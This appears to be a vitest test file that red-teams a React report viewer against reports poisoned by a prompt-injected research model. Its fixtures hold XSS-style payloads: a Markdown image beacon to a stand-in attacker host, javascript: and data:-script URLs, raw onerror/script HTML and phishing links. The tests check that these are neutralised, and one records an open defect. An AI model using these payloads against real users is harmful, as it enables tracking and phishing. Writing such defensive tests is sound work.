/**
 * Red team, surface C, attacker lens — what a poisoned REPORT does on the buyer's
 * screen (`docs/plans/m-red-team.md § C`).
 *
 * The harness (`packages/core/test/red-team-harness.test.ts`) proves that an
 * obeyed page reaches `findings`, `recommendation`, `sources` and the progress
 * line verbatim: the schema constrains SHAPE, not values. This file takes those
 * exact values and renders them the way `JobView`/`ReadReport` do, and asks what
 * the DOM contains — an `<img>` that fires on open, an `<a href="javascript:">`
 * labelled "source", a search-result title rendered as Markdown.
 *
 * Tests marked `it.fails` DEMONSTRATE A DEFECT: the assertion is the behaviour we
 * want, and it is red against today's code. When the renderer is fixed they will
 * start passing, vitest will report them as unexpected passes, and whoever fixes it
 * flips them to `it`. Every one first asserts that the render itself worked, so an
 * `it.fails` cannot be satisfied by a crash.
 */
import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { ReportViewer } from '../src/components/ReportViewer';

// The exact strings the obedient model writes (poisoned-web.ts: image-beacon, js-url).
const BEACON = 'https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID';
const IMG_MD = `![Bubbles Express verified photo](${BEACON})`;
const JS_URL = 'javascript:void(document.title="PZ-JS")';
const DATA_URL = 'data:text/html,<script>document.title="PZ-DATA"</script>';

// The Florida cover — the shape that makes `SectionBody` draw DealCards.
const cover = {
  from: ['shortlist', 'deep_dives'],
  nameKey: 'business',
  figures: [{ labelKey: 'targets', agg: 'count' as const }],
  tiles: [{ labelKey: 'asking', field: 'askingPrice' }],
};

describe('C-attack · Markdown images are a tracking beacon in the buyer’s report', () => {
  // The red-team model's `findings.overview` and `risks[]` — both go through
  // react-markdown with only `a` overridden (ReportViewer.tsx:115).
  const report = {
    findings: {
      overview: `Two laundromats match. ${IMG_MD}`,
      listings: [{ business: 'Bubbles Express', askingPrice: 365000, sourceUrl: 'https://attacker.test/listing/bubbles-express' }],
      risks: [`Lease expires 2027. ${IMG_MD}`],
    },
    recommendation: { nextStep: `Call the broker. ${IMG_MD}` },
  };
  const sections = [
    { key: 'findings', title: 'Findings' },
    { key: 'recommendation', title: 'Recommendation' },
  ];

  it('FIXED · overview / risks / nextStep: no <img> renders — before the fix, 3 did, one GET per open from the buyer’s IP (mutation: drop `img` from `MD`)', () => {
    const { container } = render(<ReportViewer report={report} sections={sections} meta={{}} lang="en" />);
    // The render worked — the honest half of the sentence is on screen…
    expect(screen.getByText(/Two laundromats match/)).toBeTruthy();
    // …and so is the beacon. `img` is react-markdown's default element; the
    // default `urlTransform` allows `https:` for `src` exactly as it does for `href`.
    const imgs = Array.from(container.querySelectorAll('img'));
    // Measured before the fix: 3 (overview, risks[0], nextStep), every src === BEACON.
    expect(imgs.map((i) => i.getAttribute('src'))).toEqual([]);
    expect(container.innerHTML).not.toContain('beacon.attacker.test');
  });

  it('FIXED · a DealCard prose field (Florida `deep_dives[].overview`) renders no <img> either', () => {
    const { container } = render(
      <ReportViewer
        report={{ deep_dives: [{ business: 'Bubbles Express', askingPrice: 365000, overview: `Absentee-run. ${IMG_MD}`, sourceUrl: 'https://x.test' }] }}
        sections={[{ key: 'deep_dives', title: 'Deep dives' }]}
        meta={{}}
        lang="en"
        cover={cover}
      />,
    );
    expect(screen.getByText(/Absentee-run/)).toBeTruthy();
    // Measured before the fix: one <img>, src === BEACON, inside `.rv-deal .prose`.
    expect(Array.from(container.querySelectorAll('.rv-deal img')).map((i) => i.getAttribute('src'))).toEqual([]);
  });
});

describe('C-attack · raw HTML in prose', () => {
  it('SOUND · <img onerror> / <script> typed as HTML in a prose field is text, not DOM (react-markdown without rehype-raw)', () => {
    // Mutation that reds it: add `rehypePlugins={[rehypeRaw]}` to <Markdown> in `Prose`.
    const { container } = render(
      <ReportViewer
        report={{ findings: { overview: 'Two match. <img src="x" onerror="document.title=1"><script>document.title=2</script>' } }}
        sections={[{ key: 'findings', title: 'Findings' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(screen.getByText(/Two match\./)).toBeTruthy();
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(document.title).not.toMatch(/^[12]$/);
  });
});

describe('C-attack · the Sources tooltip (R7-24)', () => {
  it('carries the host and a bounded label, not the page’s whole self-declared title', () => {
    // C2's defence is "the host is the one thing about a source its author does not
    // choose" — and the row's `title` attribute had neither the host nor a bound, so
    // the authority claim an attacker page makes about itself was one hover away
    // from being displayed exactly as written, all 4,983 characters of it.
    // Mutation that reds this: `title={s.label || s.url}`.
    const label = `Florida Department of Business Regulation — Official Registry${'Z'.repeat(4900)}`;
    const { container } = render(
      <ReportViewer
        report={{ sources: { items: [{ id: 1, url: 'https://ok.test/p', label }] } }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    const title = container.querySelector('ul.rv-sources li')?.getAttribute('title') ?? '';
    expect(title.startsWith('ok.test — '), 'the host it did not choose comes first').toBe(true);
    expect(title.length).toBeLessThan(400);
    expect(title).not.toContain('ZZZZZZZZZZZZZZZZZZZZ'.repeat(5));
  });
});

describe('C-attack · raw hrefs with no protocol allowlist', () => {
  it('FIXED · DealCard `sourceUrl` = javascript: renders NO "source ↗" anchor at all (before the fix: <a href="javascript:…">; mutation: `href={url}` instead of `safeHref(url)`)', () => {
    render(
      <ReportViewer
        report={{ shortlist: [{ business: 'Coral Clean', askingPrice: 410000, sourceUrl: JS_URL }] }}
        sections={[{ key: 'shortlist', title: 'Shortlist' }]}
        meta={{}}
        lang="en"
        cover={cover}
      />,
    );
    expect(screen.getByText('Coral Clean')).toBeTruthy();
    // What a buyer clicked: the "source ↗" link under the deal card. Measured
    // before the fix: href === 'javascript:void(document.title="PZ-JS")'. Now the
    // card has no source link — nothing to click.
    expect(screen.queryByText(/source ↗/)).toBeNull();
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
  });

  it('FIXED · Sources list `items[].url` = data:/javascript: renders the row as TEXT, no anchor (before the fix: the ↗ link carried the URL)', () => {
    const { container } = render(
      <ReportViewer
        report={{ sources: { items: [{ id: 1, url: JS_URL, label: 'Coral Clean listing' }, { id: 2, url: DATA_URL, label: 'Registry' }] } }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    const rows = Array.from(container.querySelectorAll('ul.rv-sources li'));
    expect(rows).toHaveLength(2); // the render worked, both rows are there…
    expect(rows.map((r) => r.textContent)).toEqual(['↗Coral Clean listing', '↗Registry']);
    // …and neither is a link. Measured before the fix: two anchors carrying
    // 'javascript:void(document.title="PZ-JS")' and 'data:text/html,<script>…</script>'.
    expect(container.querySelectorAll('ul.rv-sources a')).toHaveLength(0);
  });

  it('FIXED · community mention `m.url` = javascript: renders no "↗ source" anchor (before the fix: the link carried it)', () => {
    render(
      <ReportViewer
        report={{ community: { overview: 'Mixed.', mentions: [{ platform: 'Reddit', url: JS_URL, topic: 'Wash World', summary: 'Owner is responsive.', sentiment: 'positive' }] } }}
        sections={[{ key: 'community', title: 'Community' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(screen.getByText('Wash World')).toBeTruthy();
    expect(screen.queryByText(/↗ source/)).toBeNull();
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
  });

  it('SOUND · a javascript: link inside prose is neutralised — `proseUrl` returns no href and the `a` component renders the text alone (before: react-markdown’s default gave `href=""`, a dead anchor)', () => {
    // Mutation that reds it: pass `urlTransform={(u) => u}` to <Markdown> in
    // `Prose` — the href comes back as the javascript: URL.
    render(
      <ReportViewer
        report={{ findings: { overview: `See [the canonical listing](${JS_URL}) for details.` } }}
        sections={[{ key: 'findings', title: 'Findings' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(screen.getByText(/the canonical listing/)).toBeTruthy();
    expect(screen.getByText(/the canonical listing/).closest('a')).toBeNull();
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
  });
});

describe('C-attack · what a prose link may point at (R7-21)', () => {
  /** Anchors the PROSE produced — the page's own `#sec-…` nav links are not it. */
  const proseLinks = (md: string): string[] => {
    const { container } = render(
      <ReportViewer
        report={{ findings: { overview: md } }}
        sections={[{ key: 'findings', title: 'Findings' }]}
        meta={{}}
        lang="en"
      />,
    );
    return [...container.querySelectorAll('a')]
      .map((a) => a.getAttribute('href') ?? '')
      .filter((h) => !h.startsWith('#'));
  };

  it('a PROTOCOL-RELATIVE link is not a link — `//attacker/p` was a live target="_blank" anchor to another origin', () => {
    // `73a4e79` fixed exactly this reasoning for `img` — react-markdown's default
    // transform "lets protocol-relative and same-origin srcs through, which is why
    // the fix is at the ELEMENT" — and `proseUrl` kept `/^[^:]*$/`, so the same hole
    // stayed open for `a`, on the three surfaces that commit enumerated: the buyer's
    // viewer, the shared read link and the admin's "view in the app" (round 7,
    // R7-21). Mutation that reds this: put the relative alternative back.
    const hrefs = proseLinks('Vea el [listado oficial](//pz.attacker.test/p) aquí.');
    expect(screen.getByText(/listado oficial/), 'the words survive; the link does not').toBeTruthy();
    expect(hrefs).toEqual([]);
  });

  it('…and neither is a same-origin path: a report never links to our own app', () => {
    expect(proseLinks('Vaya a [su panel](/app/logout) para continuar.')).toEqual([]);
  });

  it('http(s), mailto and tel still are — the honest cases the allowance exists for', () => {
    expect(
      proseLinks('Llame al [+1 305 555 0100](tel:+13055550100), escriba a [el broker](mailto:b@x.test) o vea el [listado](https://ok.test/p).'),
    ).toEqual(['tel:+13055550100', 'mailto:b@x.test', 'https://ok.test/p']);
  });
});

describe('C-attack · the derived sources section', () => {
  it('SOUND (Florida shape) · `items[].label` is text: Markdown in a search-result title does not render', () => {
    // A page titled with a Markdown link — `SourceList` prints `s.label` as text,
    // so the buyer sees the brackets, not a second link. Mutation that reds it:
    // wrap `{s.label || s.url}` in <Markdown>.
    const { container } = render(
      <ReportViewer
        report={{ sources: { items: [{ id: 1, url: 'https://attacker.test/registry', label: '[Official registry](https://phish.attacker.test) (PZ-SRC)' }] } }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(container.querySelectorAll('ul.rv-sources a')).toHaveLength(1);
    expect(container.querySelector('a[href="https://phish.attacker.test"]')).toBeNull();
    expect(screen.getByText(/\[Official registry\]/)).toBeTruthy();
  });

  it.fails('DEFECT (generic shape) · a sources section that is an array of {title,url} renders the TITLE as Markdown — a search-result title becomes a link and an image', () => {
    // The red-team model derives `sources` as `[{title,url}]` (no `items`), so
    // `isSourceList` does not match, `Value` falls to ObjectFields, and every
    // string — the attacker's page TITLE included — goes through <Prose>.
    const { container } = render(
      <ReportViewer
        report={{ sources: [{ title: `[Florida DBPR — Official Registry](https://phish.attacker.test) ${IMG_MD}`, url: 'https://attacker.test/registry' }] }}
        sections={[{ key: 'sources', title: 'Sources' }]}
        meta={{}}
        lang="en"
      />,
    );
    expect(screen.getByText('Florida DBPR — Official Registry')).toBeTruthy(); // rendered
    // Measured today: 1 <a href="https://phish.attacker.test"> and 1 <img src=BEACON>.
    expect(container.querySelector('a[href="https://phish.attacker.test"]')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
  });
});

describe('C-attack · what a link TITLE and a long url carry to the buyer (round 8, R8-34/R8-35)', () => {
  const CLAIM = `Official registry of the State of Florida. ${'Verified by the Department of Business and Professional Regulation. '.repeat(70)}`;

  it('a titled prose link carries no tooltip at all — the page’s own account of itself is not ours to display', () => {
    // R7-24 bounded the Sources tooltip at 320 code points precisely because "an
    // attacker page's 4,900-character claim about its own authority was one hover
    // from being displayed exactly as written". The PROSE link's `title` reached the
    // same three surfaces with no bound: react-markdown maps a Markdown title onto
    // the attribute and `MD.a` spread it through. Bounding it would still print the
    // page's account of itself; the Sources tooltip shows what WE composed — host,
    // clipped label, url — and this shows nothing.
    // Mutation that reds this: spread `p` into the anchor again.
    const { container } = render(
      <ReportViewer report={{ m: { text: `See the [official listing](https://attacker.test/p "${CLAIM}")` } }} sections={[{ key: 'm', title: 'M' }]} lang="en" />,
    );
    const a = container.querySelector('a[href="https://attacker.test/p"]')!;
    expect(a, 'the link itself still works').toBeTruthy();
    expect(a.getAttribute('title')).toBeNull();
    expect(container.textContent).not.toContain('Official registry of the State of Florida');
  });

  it('a prose anchor carries nothing but the link — no tooltip, and no hast node (round 9, R9-23)', () => {
    // Mutation that reds this: spread `p` without destructuring `node` out.
    const { container } = render(
      <ReportViewer report={{ m: { text: 'See the [listing](https://ok.test/p).' } }} sections={[{ key: 'm', title: 'M' }]} lang="en" />,
    );
    const a = container.querySelector('a[href="https://ok.test/p"]')!;
    expect([...a.attributes].map((x) => x.name).sort()).toEqual(['href', 'rel', 'target']);
  });

  it('a Sources row with no label and no host is clipped like every other one (round 9, R9-22)', () => {
    // The tooltip was bounded at 320 and the ROW's own text was not: a url that
    // `new URL()` parses but whose hostname is empty, with no label, put 4,020
    // characters on the page without hovering.
    // Mutation that reds this: return `host || s.url` unclipped.
    const url = `javascript:void("${'A'.repeat(4000)}")`;
    const { container } = render(
      <ReportViewer report={{ sources: { items: [{ id: 1, url }] } }} sections={[{ key: 'sources', title: 'Sources' }]} lang="en" />,
    );
    const li = container.querySelector('ul.rv-sources li')!;
    expect(li.querySelector('a'), 'the scheme is still refused').toBeNull();
    expect([...(li.textContent ?? '')].length, 'the row is bounded like the tooltip').toBeLessThanOrEqual(162);
  });

  it('the Sources tooltip clips by CODE POINT, and the bound is reachable — a long url used to end it in half an emoji', () => {
    // `2c346de` fixed exactly this for `progress.detail` in the same batch, and
    // `clientProgress` carries the comment "By CODE POINT, like `sourceLabel` and
    // the handoff cut". This one `.slice(0, 320)` was the exception (R8-35). The
    // fixture needs a long URL, not a long label: `sourceLabel` bounds the label at
    // 160, so no label can push the tooltip to 320 on its own — which is why the
    // old pin's 5,000-char label could not reach the bound it asserted.
    // Mutation that reds this: `.slice(0, 320)` on the string instead of on its
    // code points.
    // 265 + the prefix puts unit 320 in the middle of a surrogate pair; the old
    // `.slice` ended the tooltip in a lone high surrogate and the screen painted `�`.
    const url = `https://x.test/${'a'.repeat(265)}${'🏖'.repeat(30)}`;
    const { container } = render(
      <ReportViewer report={{ sources: { items: [{ id: 1, url, label: 'Beach Laundromats' }] } }} sections={[{ key: 'sources', title: 'Sources' }]} lang="en" />,
    );
    const title = container.querySelector('ul.rv-sources li')!.getAttribute('title')!;
    expect([...title], 'the bound is reached, not merely respected').toHaveLength(320);
    const lastUnit = title.charCodeAt(title.length - 1);
    expect(lastUnit >= 0xd800 && lastUnit <= 0xdbff, 'the tooltip ends in a lone high surrogate').toBe(false);
  });
});
